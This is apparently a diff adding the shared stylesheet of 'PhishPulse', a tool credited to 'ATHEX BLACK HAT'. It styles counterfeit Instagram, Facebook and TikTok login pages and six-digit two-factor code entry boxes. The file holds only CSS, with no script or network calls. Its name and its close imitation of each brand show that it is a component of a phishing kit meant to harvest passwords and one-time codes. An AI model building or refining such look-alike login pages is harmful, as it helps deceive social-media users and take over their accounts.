@@ -1,0 +1,576 @@
+/* ============================================
+   PhishPulse - Common Styles
+   Version: 1.0
+   Author: ATHEX BLACK HAT
+   ============================================ */
+
+/* Reset */
+*, *::before, *::after {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+/* Variables */
+:root {
+    --ig-bg: #fafafa;
+    --ig-white: #ffffff;
+    --ig-border: #dbdbdb;
+    --ig-text: #262626;
+    --ig-text-secondary: #8e8e8e;
+    --ig-blue: #0095f6;
+    --ig-blue-hover: #1877f2;
+    --ig-red: #ed4956;
+    --ig-facebook: #385185;
+    
+    --fb-bg: #f0f2f5;
+    --fb-white: #ffffff;
+    --fb-blue: #1877f2;
+    --fb-blue-hover: #166fe5;
+    --fb-green: #42b72a;
+    --fb-text: #1c1e21;
+    --fb-text-secondary: #606770;
+    --fb-border: #dddfe2;
+    
+    --tt-bg: #121212;
+    --tt-white: #ffffff;
+    --tt-text: #ffffff;
+    --tt-text-secondary: #a7a7a7;
+    --tt-pink: #ff0050;
+    --tt-cyan: #00f2ea;
+    --tt-border: #2a2a2a;
+    --tt-input-bg: #1a1a1a;
+}
+
+/* ============================================ */
+/* COMMON STYLES */
+/* ============================================ */
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+}
+
+/* Container */
+.login-container,
+.twofa-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+.login-box,
+.twofa-box {
+    width: 100%;
+    max-width: 400px;
+    padding: 40px;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    animation: fadeInUp 0.5s ease;
+}
+
+/* Animations */
+@keyframes fadeInUp {
+    from {
+        opacity: 0;
+        transform: translateY(20px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    10%, 90% { transform: translateX(-5px); }
+    20%, 80% { transform: translateX(5px); }
+    30%, 70% { transform: translateX(-5px); }
+    40%, 60% { transform: translateX(5px); }
+    50% { transform: translateX(-5px); }
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Shake class */
+.shake {
+    animation: shake 0.5s ease;
+}
+
+/* Slide up */
+.slide-up {
+    animation: fadeInUp 0.5s ease both;
+}
+
+/* Fade in */
+.fade-in {
+    animation: fadeInUp 0.6s ease;
+}
+
+/* ============================================ */
+/* FORM ELEMENTS */
+/* ============================================ */
+
+.form-group {
+    margin-bottom: 15px;
+    position: relative;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: 600;
+    font-size: 14px;
+}
+
+.input-group {
+    position: relative;
+    display: flex;
+    align-items: center;
+}
+
+.form-input {
+    width: 100%;
+    padding: 12px 15px;
+    border: 1px solid var(--ig-border);
+    border-radius: 6px;
+    font-size: 14px;
+    transition: border-color 0.3s ease;
+    outline: none;
+    background: var(--ig-white);
+}
+
+.form-input:focus {
+    border-color: var(--ig-blue);
+    box-shadow: 0 0 0 2px rgba(0, 149, 246, 0.1);
+}
+
+.form-input.error {
+    border-color: var(--ig-red);
+}
+
+/* Password toggle */
+.password-toggle {
+    position: absolute;
+    right: 10px;
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: var(--ig-text-secondary);
+    font-size: 14px;
+    font-weight: 600;
+    padding: 5px 10px;
+}
+
+.password-toggle:hover {
+    color: var(--ig-text);
+}
+
+/* Submit button */
+.submit-btn {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    text-align: center;
+}
+
+.submit-btn:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+}
+
+/* Error message */
+.error-message {
+    background: rgba(237, 73, 86, 0.1);
+    border: 1px solid rgba(237, 73, 86, 0.3);
+    color: #ed4956;
+    padding: 10px 15px;
+    border-radius: 6px;
+    font-size: 13px;
+    margin-bottom: 15px;
+    display: none;
+    animation: fadeInUp 0.3s ease;
+}
+
+/* Loader */
+.loader {
+    display: none;
+    text-align: center;
+    padding: 10px;
+}
+
+.loader-spinner {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 2px solid #ccc;
+    border-top-color: #333;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+/* ============================================ */
+/* INSTAGRAM STYLES */
+/* ============================================ */
+
+body.instagram {
+    background: var(--ig-bg);
+}
+
+.instagram .login-box,
+.instagram .twofa-box {
+    background: var(--ig-white);
+    border: 1px solid var(--ig-border);
+}
+
+.instagram .logo {
+    text-align: center;
+    margin-bottom: 30px;
+    font-size: 36px;
+    font-weight: 700;
+    font-family: 'Billabong', 'Segoe Script', cursive;
+    color: var(--ig-text);
+}
+
+.instagram .form-input {
+    background: var(--ig-bg);
+    border: 1px solid var(--ig-border);
+    border-radius: 3px;
+    padding: 10px 12px;
+    font-size: 12px;
+}
+
+.instagram .form-input:focus {
+    border-color: #a8a8a8;
+    box-shadow: none;
+}
+
+.instagram .submit-btn {
+    background: var(--ig-blue);
+    color: white;
+    border-radius: 8px;
+    padding: 7px 16px;
+    font-size: 14px;
+    font-weight: 600;
+}
+
+.instagram .submit-btn:hover:not(:disabled) {
+    background: var(--ig-blue-hover);
+}
+
+.instagram .divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    color: var(--ig-text-secondary);
+    font-size: 13px;
+}
+
+.instagram .divider::before,
+.instagram .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--ig-border);
+}
+
+.instagram .divider span {
+    padding: 0 15px;
+}
+
+.instagram .facebook-login {
+    text-align: center;
+    margin-top: 15px;
+}
+
+.instagram .facebook-login a {
+    color: var(--ig-facebook);
+    text-decoration: none;
+    font-weight: 600;
+    font-size: 14px;
+}
+
+.instagram .forgot-password {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 12px;
+}
+
+.instagram .forgot-password a {
+    color: var(--ig-text-secondary);
+    text-decoration: none;
+}
+
+/* ============================================ */
+/* FACEBOOK STYLES */
+/* ============================================ */
+
+body.facebook {
+    background: var(--fb-bg);
+}
+
+.facebook .login-box,
+.facebook .twofa-box {
+    background: var(--fb-white);
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+}
+
+.facebook .logo {
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 36px;
+    font-weight: 700;
+    color: var(--fb-blue);
+}
+
+.facebook .logo img {
+    height: 106px;
+}
+
+.facebook .form-input {
+    border: 1px solid var(--fb-border);
+    border-radius: 6px;
+    padding: 14px 16px;
+    font-size: 17px;
+}
+
+.facebook .form-input:focus {
+    border-color: var(--fb-blue);
+    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+}
+
+.facebook .submit-btn {
+    background: var(--fb-blue);
+    color: white;
+    font-size: 20px;
+    padding: 12px;
+    border-radius: 6px;
+}
+
+.facebook .submit-btn:hover:not(:disabled) {
+    background: var(--fb-blue-hover);
+}
+
+.facebook .forgot-password {
+    text-align: center;
+    margin-top: 15px;
+}
+
+.facebook .forgot-password a {
+    color: var(--fb-blue);
+    text-decoration: none;
+    font-size: 14px;
+}
+
+.facebook .create-account {
+    text-align: center;
+    margin-top: 20px;
+    padding-top: 20px;
+    border-top: 1px solid var(--fb-border);
+}
+
+.facebook .create-account .btn-create {
+    background: var(--fb-green);
+    color: white;
+    padding: 12px 20px;
+    border-radius: 6px;
+    font-weight: 700;
+    font-size: 17px;
+    text-decoration: none;
+    display: inline-block;
+}
+
+/* ============================================ */
+/* TIKTOK STYLES */
+/* ============================================ */
+
+body.tiktok {
+    background: var(--tt-bg);
+    color: var(--tt-text);
+}
+
+.tiktok .login-box,
+.tiktok .twofa-box {
+    background: #1a1a1a;
+    border: 1px solid var(--tt-border);
+    border-radius: 12px;
+}
+
+.tiktok .logo {
+    text-align: center;
+    margin-bottom: 30px;
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--tt-white);
+}
+
+.tiktok .logo .tiktok-icon {
+    display: inline-block;
+    font-size: 40px;
+    margin-bottom: 10px;
+}
+
+.tiktok .form-input {
+    background: var(--tt-input-bg);
+    border: 1px solid var(--tt-border);
+    border-radius: 8px;
+    color: var(--tt-white);
+    padding: 14px 16px;
+    font-size: 16px;
+}
+
+.tiktok .form-input::placeholder {
+    color: var(--tt-text-secondary);
+}
+
+.tiktok .form-input:focus {
+    border-color: var(--tt-pink);
+}
+
+.tiktok .submit-btn {
+    background: var(--tt-pink);
+    color: white;
+    border-radius: 8px;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.tiktok .submit-btn:hover:not(:disabled) {
+    background: #e00045;
+}
+
+.tiktok .divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    color: var(--tt-text-secondary);
+    font-size: 13px;
+}
+
+.tiktok .divider::before,
+.tiktok .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--tt-border);
+}
+
+.tiktok .divider span {
+    padding: 0 10px;
+}
+
+.tiktok .alt-login {
+    text-align: center;
+    margin-top: 15px;
+}
+
+.tiktok .alt-login a {
+    color: var(--tt-text-secondary);
+    text-decoration: none;
+    font-size: 14px;
+}
+
+.tiktok .forgot-password {
+    text-align: center;
+    margin-top: 15px;
+}
+
+.tiktok .forgot-password a {
+    color: var(--tt-text-secondary);
+    text-decoration: none;
+    font-size: 13px;
+}
+
+/* ============================================ */
+/* 2FA CODE INPUTS */
+/* ============================================ */
+
+.code-inputs {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin: 20px 0;
+}
+
+.code-input {
+    width: 45px;
+    height: 55px;
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    border: 2px solid var(--ig-border);
+    border-radius: 8px;
+    outline: none;
+    transition: all 0.3s ease;
+}
+
+.code-input:focus {
+    border-color: var(--ig-blue);
+    box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.1);
+}
+
+.code-input.filled {
+    border-color: #a8a8a8;
+}
+
+.tiktok .code-input {
+    background: var(--tt-input-bg);
+    border-color: var(--tt-border);
+    color: var(--tt-white);
+}
+
+.tiktok .code-input:focus {
+    border-color: var(--tt-pink);
+}
+
+/* ============================================ */
+/* RESPONSIVE */
+/* ============================================ */
+
+@media (max-width: 480px) {
+    .login-box,
+    .twofa-box {
+        padding: 20px;
+        max-width: 100%;
+    }
+    
+    .code-input {
+        width: 40px;
+        height: 48px;
+        font-size: 20px;
+    }
+    
+    .code-inputs {
+        gap: 6px;
+    }
+}
+
+@media (max-width: 320px) {
+    .login-box,
+    .twofa-box {
+        padding: 15px;
+    }
+    
+    .code-input {
+        width: 35px;
+        height: 42px;
+        font-size: 18px;
+    }
+}
